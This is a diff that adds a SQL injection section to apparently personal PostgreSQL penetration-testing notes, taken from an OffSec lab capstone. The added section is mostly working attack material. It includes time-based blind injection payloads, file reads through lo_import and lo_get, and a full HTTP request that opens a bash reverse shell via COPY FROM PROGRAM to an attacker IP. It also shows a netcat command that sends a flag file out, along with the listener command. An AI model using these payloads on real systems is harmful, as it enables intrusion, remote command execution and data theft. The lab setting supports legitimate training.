@@ -91,8 +91,6 @@ Install-Module PostgreSQLCmdlets
 ```
 
 
-
-
 ## Basics commands in postgresql
 
 ```bash
@@ -113,4 +111,120 @@ SELECT * FROM NameOfColumn;
 ```
 
 
+## SQLi
 
+Original request:
+
+```html
+POST /class.php HTTP/1.1
+Host: goldenclove.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 164
+Referer: http://goldenclove.com/class.php
+Origin: http://goldenclove.com
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Connection: keep-alive
+
+weight=6&height=18&age=6&gender=Male&email=lala%40lala.com
+```
+
+
+```
+# Basic time delay confirmation:
+height=1'; SELECT pg_sleep(5)--
+```
+
+From SQL capstone in Offsec.
+
+### Reading Files via `lo_import()` + `lo_get()`
+
+PostgreSQL allows importing files as large objects (OIDs) and then reading them with `lo_get()`.
+
+#### Example:
+
+Vulnerable code:
+
+```postgresql
+$query = pg_query($con, "select * from users where email like '%" . $_POST["height"] . "%'");
+```
+
+
+This pg_query call is not sanitized and allows us to perform multi-statement injections:
+
+```postgresql
+height=1';
+CREATE TEMP TABLE x(o oid);
+INSERT INTO x VALUES(lo_import('/var/www/flag.txt'));
+SELECT pg_sleep(5) FROM pg_catalog.pg_largeobject
+WHERE substring(convert_from(lo_get((SELECT o FROM x)), 'UTF8'), 1, 1) = 'O'--
+```
+
+This triggers a 5-second delay if the first character of `/var/www/flag.txt` is `O`.
+
+### Remote Shell via `COPY FROM PROGRAM`
+
+Installations running Postgres 9.3 and above have functionality which allows for the superuser  and users with 'pg_execute_server_program' to pipe to and from an external program using COPY.   This allows arbitrary command execution as though you have console access.
+
+We confirmed the PostgreSQL user had permission to execute OS-level commands using `COPY FROM PROGRAM`, which allows exfiltration and reverse shells.
+
+Source: https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/
+
+**Trigger reverse shell via `bash`:**
+
+```
+POST /class.php HTTP/1.1
+Host: goldenclove.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 164
+Referer: http://goldenclove.com/class.php
+Origin: http://goldenclove.com
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Connection: keep-alive
+
+weight=6&height=1';CREATE TEMP TABLE x();
+COPY x FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.201/4321 0>&1"'--age=6&gender=Male&email=lala%40lala.com
+```
+
+- Creates a dummy temp table `x` (even without columns)
+- Executes `bash` using the `COPY` command to launch an interactive reverse shell
+
+This works **only if executed in the same SQL statement**, due to session-local nature of temp tables.
+
+### Alternative exfiltration via netcat:
+
+```
+height=1';
+DROP TABLE IF EXISTS x;
+CREATE TEMP TABLE x();
+COPY x FROM PROGRAM 'cat /var/www/flag.txt | nc 192.168.45.201 1234'--
+```
+
+On attacker's side:
+
+```
+nc -lvnp 1234
+```
+
+It will receive the content of /var/www/flag.txt 
+
+## Important Behavior
+
+- `pg_query()` allows stacked queries with `;`
+    
+- Each HTTP request creates a **new PostgreSQL session**
+    
+- `TEMP TABLE`s and `lo_import()` are **session-scoped**
+    
+- `COPY FROM PROGRAM` requires **superuser or pg_execute_server_program**
+    
+- Blind SQLi must be exploited **within a single SQL statement**
